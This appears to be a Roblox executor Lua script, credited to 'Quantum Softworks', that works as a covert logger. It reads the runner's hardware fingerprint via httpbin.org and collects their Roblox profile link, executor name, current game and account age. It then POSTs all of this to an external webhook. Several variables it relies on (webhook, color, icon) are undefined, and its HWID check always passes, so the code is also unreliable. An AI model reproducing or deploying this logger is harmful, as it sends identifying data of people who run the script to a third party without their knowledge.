local http_request = http_request or request or syn.request;
if syn then
   http_request = syn.request
end
 
local red = tonumber(0xC62828)
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Krnl-Hwid", "krnl-hwid", "Fingerprint", "Sw-Fingerprint", "SW-Fingerprint", "sw-fingerprint", "flux-fingerprint", "oxy-fingerprint", "evon-fingerprint", "trigon-fingerprint", "comet-fingerprint", "wrd-fingerprint", "ozone-fingerprint"};
local hwid = "";
 
for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end
 
if hwid then
local url = webhook
local data = {
["embeds"] = {
 {
     ["type"] = "rich",
     ["color"] = color,
     ["image"] = {
         ["url"] = ""
     },
     ["author"] = {
         ["name"] = " " .. hwid,
         ["icon_url"] = " " .. icon,
     },
     ["fields"] = {
         {
             ["name"] = "*Profile:*",
             ["value"] = "https://www.roblox.com/users/" ..
                 tostring(game:GetService("Players").LocalPlayer.UserId) .. "/profile",
             ["inline"] = false
         },
         {
             ["name"] = "*Executed on:*",
             ["value"] = identifyexecutor(),
             ["inline"] = true
         },
         {
             ["name"] = "*Game:*",
             ["value"] = "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/",
             ["inline"] = true
         },
         {
             ["name"] = "*Account Age: *",
             ["value"] = tostring(game:GetService("Players").LocalPlayer.AccountAge),
             ["inline"] = false
         },
         {
             ["name"] = "*Powered by Quantum Softworks*",
             ["value"] = "`Created by Quantum#0069`",
             ["inline"] = false
         }
     }
 }
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}

request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
else
	
end
